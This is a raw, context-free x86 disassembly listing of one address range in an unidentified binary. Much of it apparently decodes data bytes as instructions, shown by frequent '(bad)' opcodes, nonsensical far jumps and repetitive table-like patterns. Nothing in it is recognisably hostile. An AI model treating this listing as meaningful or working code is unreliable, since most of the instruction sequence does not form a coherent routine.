  406b18:	jp     0x406b5a
  406b1a:	jne    0x406b10
  406b1c:	add    eax,DWORD PTR [ebx]
  406b1e:	jne    0x406ac9
  406b20:	jnp    0x406b62
  406b22:	jne    0x406ad3
  406b24:	add    eax,DWORD PTR [esi*2+0x75407bc1]
  406b2b:	loopne 0x406b2f
  406b2d:	or     DWORD PTR [ebp-0x13],esi
  406b30:	jnp    0x406b72
  406b32:	jne    0x406ba4
  406b34:	add    esi,DWORD PTR [eax]
  406b36:	jne    0x406b39
  406b38:	jl     0x406b7a
  406b3a:	jne    0x406aec
  406b3c:	add    al,BYTE PTR [edi]
  406b3e:	jne    0x406b79
  406b40:	jnp    0x406b82
  406b42:	jne    0x406b09
  406b44:	add    cl,BYTE PTR [ecx]
  406b46:	jne    0x406b9d
  406b48:	jnp    0x406b8a
  406b4a:	jne    0x406b29
  406b4c:	add    cl,BYTE PTR [edx]
  406b4e:	jne    0x406ba1
  406b50:	jnp    0x406b92
  406b52:	jne    0x406b36
  406b54:	add    dl,BYTE PTR [edx]
  406b56:	jne    0x406b2d
  406b58:	mov    DWORD PTR [eax+0x75],eax
  406b5b:	add    al,BYTE PTR [edx]
  406b5d:	add    al,0x55
  406b5f:	add    bh,BYTE PTR [ecx]
  406b61:	mov    dh,BYTE PTR ds:0x79035c02
  406b67:	add    ah,BYTE PTR [ecx]
  406b69:	mov    dh,BYTE PTR [ebp-0x6bfc44fe]
  406b6f:	add    al,BYTE PTR [ebp+0x4102b58a]
  406b75:	add    eax,DWORD PTR [eax]
  406b77:	add    BYTE PTR [eax],al
  406b79:	add    BYTE PTR [eax],al
  406b7b:	xchg   DWORD PTR [edx],eax
  406b7d:	mov    ecx,0x9002b58a
  406b82:	add    edx,DWORD PTR [edi-0x4a7552fe]
  406b88:	add    dh,BYTE PTR [ecx+0x3]
  406b8b:	add    DWORD PTR [edx],0x2b58acd
  406b91:	pop    edx
  406b92:	add    edi,DWORD PTR [esi+0x2]
  406b95:	leave  
  406b96:	mov    dh,BYTE PTR [ebp-0x7dfc4efe]
  406b9c:	add    bl,cl
  406b9e:	mov    dh,BYTE PTR [ebp+0x6d04c902]
  406ba4:	add    ah,ch
  406ba6:	mov    BYTE PTR [ebp+0x78043002],dh
  406bac:	add    cl,ch
  406bae:	mov    dh,BYTE PTR ds:0x77046002
  406bb4:	add    al,cl
  406bb6:	mov    dh,BYTE PTR ds:0x69043b02
  406bbc:	add    cl,cl
  406bbe:	mov    dh,BYTE PTR ds:0x64044f02
  406bc4:	add    ch,BYTE PTR [ebp-0x5cfdca76]
  406bca:	add    al,0x84
  406bcc:	add    dl,BYTE PTR [ecx-0x76]
  406bcf:	xor    eax,0x7a03ba02
  406bd4:	add    bh,BYTE PTR [ecx]
  406bd6:	mov    dh,BYTE PTR ds:0x76e10002
  406bdc:	add    BYTE PTR [eax],al
  406bde:	dec    ecx
  406bdf:	add    BYTE PTR [eax],al
  406be1:	add    BYTE PTR [eax],al
  406be3:	add    bh,bh
  406be5:	sar    edi,0x40
  406be8:	jns    0x406be8
  406bea:	(bad)  
  406beb:	js     0x406bdc
  406bed:	sar    edi,0x6d
  406bf0:	jns    0x406bf8
  406bf2:	add    BYTE PTR [ecx-0x1],ah
  406bf5:	ret    0xadff
  406bf8:	jbe    0x406bff
  406bfa:	add    BYTE PTR [ecx-0x11],ch
  406bfd:	ret    0x2bff
  406c00:	jns    0x406c01
  406c02:	(bad)  
  406c03:	mov    eax,0x5effc2fc
  406c08:	jns    0x406c04
  406c0a:	inc    DWORD PTR [esp+ebp*8+0x76dfffc2]
  406c11:	cli    
  406c12:	push   DWORD PTR [eax-0x3003d04]
  406c18:	jbe    0x406c1f
  406c1a:	add    BYTE PTR [ecx-0x39003d14],bl
  406c20:	jbe    0x406c19
  406c22:	push   DWORD PTR [eax+0x73ffc2fc]
  406c28:	jbe    0x406c23
  406c2a:	dec    DWORD PTR [edi+ebp*8]
  406c2d:	ret    0x80ff
  406c30:	jbe    0x406c2b
  406c32:	dec    DWORD PTR [eax]
  406c34:	inc    edx
  406c36:	jmp    FWORD PTR [ebp+0x76]
  406c39:	lock (bad) 
  406c3b:	in     al,dx
  406c3c:	in     al,dx
  406c3d:	ret    0x32ff
  406c40:	jns    0x406c3d
  406c42:	(bad)  
  406c43:	call   0xc1402f44
  406c48:	add    BYTE PTR [eax],al
  406c4a:	add    BYTE PTR [eax],al
  406c4c:	add    BYTE PTR [esi-0xf],dh
  406c4f:	dec    DWORD PTR [ebx+esi*8+0x76fdffc2]
  406c56:	cli    
  406c57:	dec    DWORD PTR [eax-0x3d0d]
  406c5d:	retf   0xf01
  406c60:	add    ah,bh
  406c62:	test   BYTE PTR [eax+0x0],al
  406c65:	push   esi
  406c66:	push   es
  406c67:	pop    es
  406c68:	add    ah,dl
  406c6a:	test   BYTE PTR [eax+0x0],al
  406c6d:	les    eax,FWORD PTR [ecx]
  406c6f:	or     al,0x0
  406c71:	aam    0x84
  406c73:	inc    eax
  406c74:	add    BYTE PTR [eax],ch
  406c76:	add    DWORD PTR [ecx],ecx
  406c78:	add    al,ch
  406c7a:	test   BYTE PTR [eax+0x0],al
  406c7d:	mov    BYTE PTR [ecx],0xa
  406c80:	add    ah,ch
  406c82:	add    DWORD PTR [eax+0x0],0xffffffa8
  406c86:	add    DWORD PTR [eax+eax*1],eax
  406c89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c8a:	test   BYTE PTR [eax+0x0],al
  406c8d:	test   eax,0xfc014601
  406c92:	test   BYTE PTR [eax+0x0],al
  406c95:	outs   dx,BYTE PTR ds:[esi]
  406c96:	add    DWORD PTR [ebp+0x0],edx
  406c99:	test   BYTE PTR [esi+0x1980040],al
  406c9f:	sub    DWORD PTR [eax],eax
  406ca1:	dec    eax
  406ca2:	xchg   BYTE PTR [eax+0x0],al
  406ca5:	rol    BYTE PTR [eax],1
  406ca7:	or     al,BYTE PTR [eax]
  406ca9:	pop    esp
  406caa:	xchg   BYTE PTR [eax+0x0],al
  406cad:	add    BYTE PTR [esi],0x33
  406cb0:	add    BYTE PTR [eax],al
  406cb2:	add    BYTE PTR [eax],al
  406cb4:	add    BYTE PTR [eax],al
  406cb6:	mov    BYTE PTR [ecx+0xd50040],al
  406cbc:	pop    es
  406cbd:	add    BYTE PTR [eax-0x7f],dl
  406cc0:	inc    eax
  406cc1:	add    BYTE PTR [esi+0x6],bl
  406cc4:	or     DWORD PTR [eax],eax
  406cc6:	xor    al,0x81
  406cc8:	inc    eax
  406cc9:	add    BYTE PTR [edx+0x6],dl
  406ccc:	sub    al,0x0
  406cce:	xchg   esp,eax
  406ccf:	add    DWORD PTR [eax+0x0],0xc05dc
  406cd6:	aam    0x7f
  406cd8:	inc    eax
  406cd9:	add    BYTE PTR [ebp+0x3b],dh
  406cdc:	add    eax,DWORD PTR [ebp+esi*2+0x6b]
  406ce0:	add    BYTE PTR [eax+0x75],0x86
  406ce4:	add    al,0x4
  406ce6:	jne    0x406d5b
  406ce8:	add    BYTE PTR [eax+0x75],0x1b
  406cec:	add    al,0x4
  406cee:	jne    0x406d6b
  406cf0:	add    BYTE PTR [eax+0x75],0xb2
  406cf4:	add    ecx,DWORD PTR [edx]
  406cf6:	jne    0x406d0f
  406cf8:	add    BYTE PTR [eax+0x75],0x92
  406cfc:	add    eax,DWORD PTR [esi]
  406cfe:	jne    0x406ced
  406d00:	add    DWORD PTR [eax+0x75],0x75260415
  406d07:	test   DWORD PTR [edx+0x3647540],eax
  406d0d:	add    eax,0x4081bd75
  406d12:	jne    0x406cf0
  406d14:	add    eax,DWORD PTR [edi]
  406d16:	jne    0x406ced
  406d18:	add    DWORD PTR [eax+0x0],0x0
  406d1f:	jne    0x406d38
  406d21:	add    al,0x3
  406d23:	jne    0x406cee
  406d25:	add    DWORD PTR [eax+0x75],0x751703ef
  406d2c:	add    DWORD PTR [ecx+0x41f7540],0x8181750f
  406d36:	inc    eax
  406d37:	jne    0x406d22
  406d39:	add    eax,DWORD PTR ds:0x4081b975
  406d3f:	jne    0x406ce5
  406d41:	add    edx,DWORD PTR [esi*2+0x75408221]
  406d48:	push   edi
  406d49:	add    ebx,DWORD PTR [esi]
  406d4b:	jne    0x406d3e
  406d4d:	add    DWORD PTR [eax+0x75],0x75070410
  406d54:	stc    
  406d55:	add    DWORD PTR [eax+0x75],0x65040302
  406d5c:	add    ch,ch
  406d5e:	xor    DWORD PTR ds:0x73040502,0x3581e502
  406d68:	add    ah,BYTE PTR [ebx+eax*1-0x7e16fd8a]
  406d6f:	xor    eax,0x5a039f02
  406d74:	add    bl,BYTE PTR [ecx-0x6efdca7c]
  406d7a:	add    esp,DWORD PTR [edx+0x2]
  406d7d:	mov    eax,ds:0x7402b584
  406d82:	add    eax,DWORD PTR [eax]
  406d84:	add    BYTE PTR [eax],al
  406d86:	add    BYTE PTR [eax],al
  406d88:	pop    DWORD PTR [edx]
  406d8a:	ins    DWORD PTR es:[edi],dx
  406d8b:	test   BYTE PTR [ebp+0x6a035302],dh
  406d91:	add    ch,BYTE PTR [ebp-0x7c]
  406d94:	mov    ch,0x2
  406d96:	mov    al,BYTE PTR [ebx]
  406d98:	popa   
  406d99:	add    dh,BYTE PTR [ebp-0x32fd4a7c]
  406d9f:	add    ebx,DWORD PTR [edx+0x2]
  406da2:	mov    ch,0x84
  406da4:	mov    ch,0x2
  406da6:	jmp    0xb584:0xbd025103
  406dad:	add    bh,dh
  406daf:	add    ch,BYTE PTR [edi+0x2]
  406db2:	leave  
  406db3:	test   BYTE PTR [ebp+0x71035c02],dh
  406db9:	add    dl,cl
  406dbb:	test   BYTE PTR [ebp+0x71045802],dh
  406dc1:	add    bh,cl
  406dc3:	xor    BYTE PTR ds:0x7904b602,0x2
  406dca:	jmp    0x1842a351
  406dcf:	add    al,0x84
  406dd1:	add    cl,ch
  406dd3:	test   BYTE PTR ds:0x711c0002,dh
  406dd9:	cld    
  406dda:	dec    DWORD PTR [ecx+edi*8+0x7129ffc1]
  406de1:	(bad)  
  406de2:	jmp    FWORD PTR [ecx+edi*8+0x7112ffc1]
  406de9:	lock call DWORD PTR [eax+0x0]
  406ded:	add    BYTE PTR [eax],al
  406def:	add    BYTE PTR [eax],al
  406df1:	stc    
  406df2:	sar    edi,0xa0
  406df5:	jno    0x406de3
  406df7:	jmp    DWORD PTR [eax-0x7]
  406dfa:	sar    edi,0x1
  406dfd:	jno    0x406e10
  406dff:	add    BYTE PTR ds:0xd8ffc1f9,al
  406e05:	jbe    0x406e00
  406e07:	inc    eax
  406e09:	test   dl,0xff
  406e0c:	retf   0xf676
  406e0f:	jmp    DWORD PTR [eax-0x30003d0a]
  406e15:	jbe    0x406e0d
  406e17:	inc    DWORD PTR [eax]
  406e19:	stc    
  406e1a:	ret    0x37ff
  406e1d:	jno    0x406e20
  406e1f:	add    cl,bh
  406e21:	test   dl,0xff
  406e24:	pop    edx
  406e25:	jno    0x406e15
  406e27:	inc    DWORD PTR [eax]
  406e29:	stc    
  406e2a:	ret    0x59ff
  406e2d:	jno    0x406e2d
  406e2f:	(bad)  
  406e30:	clc    
  406e31:	test   dl,0xff
  406e34:	bound  esi,QWORD PTR [ecx-0x2]
  406e37:	push   eax
  406e39:	test   dl,0xff
  406e3c:	pushf  
  406e3d:	jbe    0x406e3d
  406e3f:	(bad)  
  406e40:	call   0x2240313b
  406e45:	jno    0x406e47
  406e47:	add    cl,ah
  406e49:	ror    DWORD PTR [ecx],0x0
  406e4c:	cmp    al,0x71
  406e4e:	idiv   bh
  406e50:	shl    BYTE PTR [ecx+0x9],0x0
  406e57:	add    BYTE PTR [eax],al
  406e59:	add    BYTE PTR [esi],dl
  406e5b:	push   es
  406e5c:	add    al,0x0
  406e5e:	mov    esp,0x45003f36
  406e63:	add    eax,0x370c001e
  406e68:	aas    
  406e69:	add    BYTE PTR [edx-0x2],bl
  406e6c:	push   es
  406e6d:	add    BYTE PTR [esi+esi*1],dl
  406e70:	aas    
  406e71:	add    BYTE PTR [eax+0x5],cl
  406e74:	(bad)  
  406e76:	xor    al,0x36
  406e78:	aas    
  406e79:	add    BYTE PTR [eax+0x30000b05],ah
  406e7f:	ss aas 
  406e81:	add    dl,bh
  406e83:	add    eax,0x361c0009
  406e88:	aas    
  406e89:	add    BYTE PTR [ebp-0x23fff2fb],ch
  406e8f:	ss aas 
  406e91:	add    BYTE PTR [ebx+0x48000a05],bh
  406e97:	ss aas 
  406e99:	add    ah,al
  406e9b:	add    eax,0x3638000d
  406ea0:	aas    
  406ea1:	add    dh,al
  406ea3:	add    eax,0x35e00016
  406ea8:	aas    
  406ea9:	add    BYTE PTR [eax+0x5],bh
  406eac:	adc    eax,0x3f364800
  406eb1:	add    BYTE PTR [ebp+eax*1+0x14],bl
  406eb5:	add    BYTE PTR [eax],dl
  406eb7:	ss aas 
  406eb9:	add    ah,ch
  406ebb:	add    al,0xf
  406ebd:	add    BYTE PTR [eax],al
  406ebf:	add    BYTE PTR [eax],al
  406ec1:	add    BYTE PTR [eax],al
  406ec3:	and    BYTE PTR [esi],dh
  406ec5:	aas    
  406ec6:	add    BYTE PTR [ebp+eax*1+0xc],ch
  406eca:	add    BYTE PTR [eax],dl
  406ecc:	ss aas 
  406ece:	add    BYTE PTR [edi-0x2],dl
  406ed1:	or     al,BYTE PTR [eax]
  406ed3:	int3   
  406ed4:	cmp    edi,DWORD PTR [edi]
  406ed6:	add    BYTE PTR [ebp-0x7f],dh
  406ed9:	add    al,0xc
  406edb:	jne    0x406f18
  406edd:	retf   0x753f
  406ee0:	add    edx,DWORD PTR es:[eax]
  406ee3:	jne    0x406e7c
  406ee5:	retf   0x753f
  406ee8:	enter  0x1303,0x75
  406eec:	ror    ecx,cl
  406eee:	aas    
  406eef:	jne    0x406f3f
  406ef1:	add    ecx,DWORD PTR [esi]
  406ef3:	jne    0x406ea8
  406ef5:	leave  
  406ef6:	aas    
  406ef7:	jne    0x406ee7
  406ef9:	add    edx,DWORD PTR [ecx]
  406efb:	jne    0x406ecc
  406efd:	leave  
  406efe:	aas    
  406eff:	jne    0x406ee3
  406f01:	add    ecx,DWORD PTR [esi]
  406f03:	jne    0x406ee4
  406f05:	leave  
  406f06:	aas    
  406f07:	jne    0x406f33
  406f09:	add    edx,DWORD PTR [eax]
  406f0b:	jne    0x406f58
  406f0d:	leave  
  406f0e:	aas    
  406f0f:	jne    0x406f70
  406f11:	add    edx,DWORD PTR [ecx]
  406f13:	jne    0x406e9a
  406f15:	leave  
  406f16:	aas    
  406f17:	jne    0x406f84
  406f19:	add    al,0x15
  406f1b:	jne    0x406eba
  406f1d:	leave  
  406f1e:	aas    
  406f1f:	jne    0x406f8c
  406f21:	add    edx,DWORD PTR [esi*2+0x3fc9f5]
  406f28:	add    BYTE PTR [eax],al
  406f2a:	add    BYTE PTR [eax],al
  406f2c:	jne    0x406ec0
  406f2e:	add    edx,DWORD PTR [edi]
  406f30:	jne    0x406f5f
  406f32:	leave  
  406f33:	aas    
  406f34:	jne    0x406ede
  406f36:	add    edx,DWORD PTR [edx]
  406f38:	jne    0x406f93
  406f3a:	leave  
  406f3b:	aas    
  406f3c:	jne    0x406ed9
  406f3e:	add    ebx,DWORD PTR [eax]
  406f40:	jne    0x406f3f
  406f42:	enter  0x753f,0xbc
  406f46:	add    ebx,DWORD PTR [ecx]
  406f48:	jne    0x406f5b
  406f4a:	leave  
  406f4b:	aas    
  406f4c:	jne    0x406faf
  406f4e:	add    esp,DWORD PTR [ebx]
  406f50:	jne    0x406f0f
  406f52:	enter  0x753f,0x2
  406f56:	fld    DWORD PTR [ebx]
  406f58:	cwde   
  406f59:	add    bl,BYTE PTR [ebp-0x37]
  406f5c:	stos   BYTE PTR es:[edi],al
  406f5d:	add    dl,BYTE PTR [esi]
  406f5f:	add    al,0x7e
  406f61:	add    cl,BYTE PTR [ecx-0x37]
  406f64:	call   0x1d02:0x76041e02
  406f6b:	leave  
  406f6c:	mov    al,BYTE PTR [edx]
  406f6e:	inc    ecx
  406f6f:	add    al,0x7a
  406f71:	add    dl,BYTE PTR ds:0xc8027ac9
  406f77:	add    edi,DWORD PTR [edx+0x2]
  406f7a:	sub    eax,0x26ac9
  406f7f:	add    al,0x81
  406f81:	add    bh,BYTE PTR [ebp-0x3dfda538]
  406f87:	add    edi,DWORD PTR [edx+0x2]
  406f8a:	(bad)
  406f8d:	add    dl,BYTE PTR [ecx+0x3]
  406f90:	add    BYTE PTR [eax],al
  406f92:	add    BYTE PTR [eax],al
  406f94:	add    BYTE PTR [edi+0x2],ch
  406f97:	ror    eax,1
  406f99:	cmp    al,BYTE PTR [edx]
  406f9b:	adc    al,BYTE PTR [ecx+eax*8]
  406f9e:	add    dh,BYTE PTR [ecx]
  406fa0:	(bad)  
  406fa1:	stos   BYTE PTR es:[edi],al
  406fa2:	add    bl,dh
  406fa4:	add    edx,DWORD PTR [edi-0x653876fe]
  406faa:	add    cl,BYTE PTR [esi+0x3]
  406fad:	mov    ds:0x8ac7b902,eax
  406fb2:	add    dh,BYTE PTR [ebx-0x3efd86fd]
  406fb8:	(bad)  
  406fb9:	jp     0x406fbd
  406fbb:	rol    BYTE PTR [ebx],1
  406fbd:	xchg   BYTE PTR [edx],al
  406fbf:	mov    ch,0xc7
  406fc1:	push   0x2
  406fc3:	hlt    
  406fc4:	add    ecx,DWORD PTR [ecx+0x5ac7cd02]
  406fca:	add    cl,BYTE PTR [esi]
  406fcc:	add    esi,DWORD PTR [ebx+0x2]
  406fcf:	ffree  st(7)
  406fd1:	dec    edx
  406fd2:	add    al,BYTE PTR [eax]
  406fd4:	mov    dl,0x76
  406fd6:	in     eax,0xff
  406fd8:	in     al,dx
  406fd9:	sub    BYTE PTR [edi],al
  406fdb:	add    BYTE PTR [edx-0x3effdd87],cl
  406fe1:	mov    eax,0x79360006
  406fe6:	(bad)  
  406fe8:	pop    eax
  406fe9:	test   al,0x6
  406feb:	add    BYTE PTR [edx+0x44fffd79],al
  406ff1:	mov    eax,0x79120006
  406ff6:	cld    
  406ff7:	call   DWORD PTR [eax]
  406ff9:	add    BYTE PTR [eax],al
  406ffb:	add    BYTE PTR [eax],al
  406ffd:	add    BYTE PTR [eax+0x79340006],ch
  407003:	or     DWORD PTR [eax],eax
  407005:	std    
  407006:	mov    ecx,0x79720006
  40700b:	adc    eax,0x6ab7d00
  407010:	add    BYTE PTR [ebx+0x79],cl
  407013:	(bad)  
  407014:	inc    DWORD PTR [ebx+edi*4+0x797e0006]
  40701b:	idiv   bh
  40701d:	xchg   esp,eax
  40701e:	stos   DWORD PTR es:[edi],eax
  40701f:	push   es
  407020:	add    BYTE PTR [ebx+0x79],bh
  407023:	stc    
  407024:	push   DWORD PTR [eax]
  407026:	cmp    eax,DWORD PTR [esi]
  407028:	add    BYTE PTR [eax+0x79],bh
  40702b:	stc    
  40702c:	dec    DWORD PTR [ebx+ebp*1+0x76e30006]
  407033:	clc    
  407034:	(bad)  
  407035:	js     0x407072
  407037:	push   es
  407038:	add    BYTE PTR [edx+0x79],al
  40703b:	stc    
  40703c:	inc    DWORD PTR [ebx+ebp*1+0x791e0006]
  407043:	idiv   bh
  407045:	je     0x407082
  407047:	push   es
  407048:	add    BYTE PTR [edi+0x79],dh
  40704b:	push   ss
  40704c:	add    BYTE PTR [ebp+0x628],al
  407052:	outs   dx,DWORD PTR ds:[esi]
  407053:	dec    BYTE PTR [edx]
  407055:	add    ah,dl
  407057:	aaa    
  407058:	aas    
  407059:	add    BYTE PTR [ebx-0x2ffff002],dl
  40705f:	aaa    
  407060:	aas    
  407061:	add    BYTE PTR [eax],al
  407063:	add    BYTE PTR [eax],al
  407065:	add    BYTE PTR [eax],al
  407067:	fiadd  WORD PTR [ecx]
  407069:	or     eax,DWORD PTR [eax]
  40706b:	xchg   esp,eax
  40706c:	xor    al,0x3f
  40706e:	add    BYTE PTR [ebx],ch
  407070:	add    cl,BYTE PTR [ebx]
  407072:	add    al,bl
  407074:	aaa    
  407075:	aas    
  407076:	add    BYTE PTR [edx+0x1],cl
  407079:	pop    es
  40707a:	add    BYTE PTR [eax+0x34],dh
  40707d:	aas    
  40707e:	add    BYTE PTR [eax-0x2],dh
  407081:	adc    DWORD PTR [eax],eax
  407083:	pushf  
  407084:	aaa    
  407085:	aas    
  407086:	add    BYTE PTR [ecx+0x40025fe],dl
  40708c:	cmp    DWORD PTR [edi],edi
  40708e:	add    BYTE PTR [edi-0x2],bl
  407091:	or     eax,DWORD PTR [eax]
  407093:	in     al,0x38
  407095:	aas    
  407096:	add    BYTE PTR [esi],ch
  407098:	add    DWORD PTR ds:0x3f38dc00,edx
  40709e:	add    BYTE PTR [esi],ch
  4070a0:	add    DWORD PTR ds:0x3f383c00,ecx
  4070a6:	add    dh,ah
  4070a8:	add    DWORD PTR [ecx],edx
  4070aa:	add    al,ch
  4070ac:	cmp    BYTE PTR [edi],bh
  4070ae:	add    BYTE PTR [ebx-0x2],bh
  4070b1:	or     al,BYTE PTR [eax]
  4070b3:	fdivr  QWORD PTR [eax]
  4070b5:	aas    
  4070b6:	add    BYTE PTR [edx+0xc001f01],dl
  4070bc:	cmp    BYTE PTR [edi],bh
  4070be:	add    dl,ch
  4070c0:	add    BYTE PTR [ecx],cl
  4070c2:	add    BYTE PTR [eax],dh
  4070c4:	cmp    BYTE PTR [edi],bh
  4070c6:	add    BYTE PTR [edi],bl
  4070c8:	add    DWORD PTR [ebx],eax
  4070ca:	add    BYTE PTR [eax],al
  4070cc:	add    BYTE PTR [eax],al
  4070ce:	add    BYTE PTR [eax],al
  4070d0:	cld    
  4070d1:	aaa    
  4070d2:	aas    
  4070d3:	add    BYTE PTR [ebp+0x5b],dh
  4070d6:	add    eax,DWORD PTR [eax]
  4070d8:	jne    0x407135
  4070da:	add    eax,DWORD PTR [eax]
  4070dc:	jne    0x4070e9
  4070de:	aaa    
  4070df:	mov    ebp,ebp
  4070e1:	push   ebp
  4070e2:	push   esp
  4070e3:	fiadd  DWORD PTR [esi-0x2d]
  4070e6:	(bad)  
  4070e7:	xor    DWORD PTR [ecx-0x35],esi
  4070ea:	stc    
  4070eb:	cwde   
  4070ec:	dec    ecx
  4070ed:	ret    0x1dd
  4070f0:	adc    edx,DWORD PTR [edi+0x42]
  4070f3:	push   edi
  4070f4:	in     eax,0x93
  4070f6:	push   eax
  4070f7:	pop    es
  4070f8:	ins    DWORD PTR es:[edi],dx
  4070f9:	adc    DWORD PTR [ebx],esp
  4070fb:	sub    esi,DWORD PTR [eax+0x3ee3eacd]
  407101:	ins    BYTE PTR es:[edi],dx
  407102:	les    ecx,FWORD PTR [ebp+0x20]
  407105:	cmp    eax,0x66e02457
  40710a:	sub    ch,BYTE PTR [esi-0x6]
  40710d:	cmp    esi,ebx
  40710f:	je     0x4070aa
  407111:	adc    BYTE PTR [ecx],0x1b
  407114:	inc    ebx
  407115:	aad    0x58
  407117:	mov    ds:0x3d87c850,eax
  40711c:	ds or  al,0x21
  40711f:	adc    al,0x48
  407121:	js     0x407148
  407123:	(bad)  
  407124:	sbb    ah,BYTE PTR [edi-0x549a0d42]
  40712a:	test   al,0x8e
  40712c:	inc    edi
  40712d:	sbb    ecx,0xc9e0b8dc
  407133:	jmp    0x407135
  407135:	add    BYTE PTR [eax],al
  407137:	add    BYTE PTR [eax],al
  407139:	jle    0x407185
  40713b:	adc    eax,DWORD PTR [esi]
  40713d:	sbb    dl,dh
  40713f:	fdiv   QWORD PTR [eax]
  407141:	mov    edi,esp
  407143:	cmp    cl,BYTE PTR [ebx-0x76]
  407146:	push   ecx
  407147:	xor    ebp,DWORD PTR [eax+0x73]
  40714a:	adc    DWORD PTR [esi],0xffffffc8
  40714d:	popf   
  40714e:	mov    bl,bh
  407150:	cdq    
  407151:	pop    es
  407152:	add    ecx,DWORD PTR [ebp-0x65]
  407155:	ret    0xe911
  407158:	jecxz  0x40717c
  40715a:	inc    esp
  40715b:	popa   
  40715c:	add    eax,0x13e50275
  407161:	adc    DWORD PTR [edx],0x126913dd
  407167:	lds    edx,FWORD PTR [ebx]
  407169:	push   ecx
  40716a:	fild   QWORD PTR [edi+0x4]
  40716d:	rcr    BYTE PTR [esi-0x246dbf2f],cl
  407173:	pop    eax
  407174:	(bad)  
  407175:	xchg   ebx,eax
  407176:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407177:	mov    edi,0x26083af9
  40717c:	(bad)  
  40717d:	out    dx,eax
  40717e:	inc    edi
  40717f:	push   esp
  407180:	xor    ecx,DWORD PTR [edx-0x16ec50c3]
  407186:	adc    al,BYTE PTR [ebp+0x7d131113]
  40718c:	adc    edi,ecx
  40718e:	adc    ah,BYTE PTR [ebp-0x42ed3eed]
  407194:	adc    ecx,ecx
  407196:	adc    dl,BYTE PTR [edi-0x10]
  407199:	push   edi
  40719a:	lock mov WORD PTR [esi],gs
  40719d:	add    BYTE PTR [eax],al
  40719f:	add    BYTE PTR [eax],al
  4071a1:	add    BYTE PTR [edx-0x40],ch
  4071a4:	or     ah,al
  4071a6:	xchg   BYTE PTR ds:0xdf581aa2,bl
  4071ac:	fsub   DWORD PTR cs:0xc239761e
  4071b3:	dec    esi
  4071b4:	mov    eax,ds:0xbd11bed4
  4071b9:	adc    al,0xc9
  4071bb:	adc    ebp,eax
  4071bd:	adc    al,0xd1
  4071bf:	adc    ebp,ebx
  4071c1:	adc    al,0xd9
  4071c3:	adc    DWORD PTR [ebp+0x14],esp
  4071c6:	add    DWORD PTR [ecx],edx
  4071c8:	pop    ebp
  4071c9:	push   ecx
  4071ca:	test   esi,edx
  4071cc:	addr16 in al,dx
  4071ce:	int    0xaf
  4071d0:	dec    DWORD PTR [eax-0x5487a2f2]
  4071d6:	loop   0x4071ee
  4071d8:	js     0x40718e
  4071da:	lds    edi,FWORD PTR [edi]
  4071dc:	aas    
  4071dd:	mov    ah,0x94
  4071df:	popf   
  4071e0:	mov    eax,DWORD PTR [edx-0x1ace64b6]
  4071e6:	div    BYTE PTR fs:[ecx]
  4071e9:	frstor [esi+eiz*8+0x31]
  4071ed:	lds    esp,FWORD PTR [esi+edx*1+0x32]
  4071f1:	mov    ebp,0xa5320664
  4071f6:	test   BYTE PTR [ebx+0x65],dh
  4071f9:	div    BYTE PTR [ecx]
  4071fb:	hlt    
  4071fc:	mov    al,BYTE PTR [ecx]
  4071fe:	sbb    DWORD PTR [edx-0x74],0x75
  407202:	cmp    BYTE PTR [ecx+ebp*1+0x51],0x0
  407207:	add    BYTE PTR [eax],al
  407209:	add    BYTE PTR [eax],al
  40720b:	nop
  40720c:	mov    ds:0x38a66ece,eax
  407211:	dec    esi
  407212:	cwde   
  407213:	sub    esi,0x86677d72
  407219:	xor    ah,BYTE PTR [ebp-0x42cdc979]
  40721f:	xchg   DWORD PTR [esi],esp
  407221:	xor    al,BYTE PTR [ebp-0x62cda979]
  407227:	xchg   DWORD PTR [esi-0x10],eax
  40722a:	imul   esp,DWORD PTR ds:0xe3c70420,0x509ebcf1
  407234:	sbb    al,0x66
  407236:	arpl   WORD PTR [edi-0x2bfb786e],di
  40723c:	jns    0x4072b4
  40723e:	scas   eax,DWORD PTR es:[edi]
  40723f:	aam    0xda
  407241:	cmp    DWORD PTR [edx],ecx
  407243:	test   BYTE PTR [esi-0x417a22ce],ch
  407249:	xor    ah,BYTE PTR [ebp+0x64]
  40724c:	mov    ?,WORD PTR [ebx]
  40724e:	add    BYTE PTR [eax-0x7cc63ed],ch
  407254:	adc    ebp,DWORD PTR [ebx+esi*1+0xf4007fb]
  40725b:	imul   ecx,DWORD PTR ds:0xe0513a0d,0x713b3197
  407265:	jge    0x4071ec
  407267:	jbe    0x407207
  407269:	js     0x4071ee
  40726b:	out    dx,al
  40726c:	adc    dh,BYTE PTR [ebx+0x7f]
  407272:	add    BYTE PTR [eax],al
  407274:	ret    0x1b6f
  407277:	xor    al,0x38
  407279:	adc    ch,BYTE PTR [esp+esi*1]
  40727c:	mov    eax,0x18343c11
  407281:	adc    cl,BYTE PTR [esp+esi*1-0x58]
  407285:	adc    bl,BYTE PTR [esp+esi*1+0x38]
  407289:	iret   
  40728a:	nop
  40728b:	sub    DWORD PTR [ebp+0x4b540af4],edi
  407291:	jl     0x4072cc
  407293:	inc    edx
  407294:	out    dx,al
  407295:	ins    DWORD PTR es:[edi],dx
  407296:	pop    esi
  407297:	dec    eax
  407298:	pop    es
  407299:	push   eax
  40729a:	push   es
  40729b:	xchg   DWORD PTR [ebx+0x20039ebd],edx
  4072a1:	push   ds
  4072a2:	lahf   
  4072a3:	xor    al,0xe8
  4072a5:	adc    esp,ebx
  4072a7:	xor    al,0xf8
  4072a9:	adc    esp,ebp
  4072ab:	xor    al,0xf8
  4072ad:	adc    esp,edi
  4072af:	xor    al,0x98
  4072b1:	adc    BYTE PTR [esi*1-0x321ef58],cl
  4072b8:	fiadd  DWORD PTR [ebx+0x2ed2ee3a]
  4072be:	pop    eax
  4072bf:	inc    esi
  4072c0:	and    bl,bl
  4072c2:	icebp  
  4072c3:	fcmovne st,st(2)
  4072c5:	fcmovnbe st,st(3)
  4072c7:	pop    ebx
  4072c8:	inc    ebx
  4072c9:	sahf   
  4072ca:	xor    bl,BYTE PTR [esi]
  4072cc:	jne    0x4072fb
  4072ce:	mov    bl,0xe
  4072d0:	shl    BYTE PTR [edi-0x207f73f3],1
  4072d6:	or     eax,0x9c
  4072db:	add    BYTE PTR [eax],al
  4072dd:	mov    BYTE PTR [edi-0x407f53f2],al
  4072e3:	or     eax,0xde768bc
  4072e8:	int3   
  4072e9:	fwait
  4072ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072eb:	lock jmp 0x4e49:0xe21422e5
  4072f3:	rcr    bh,1
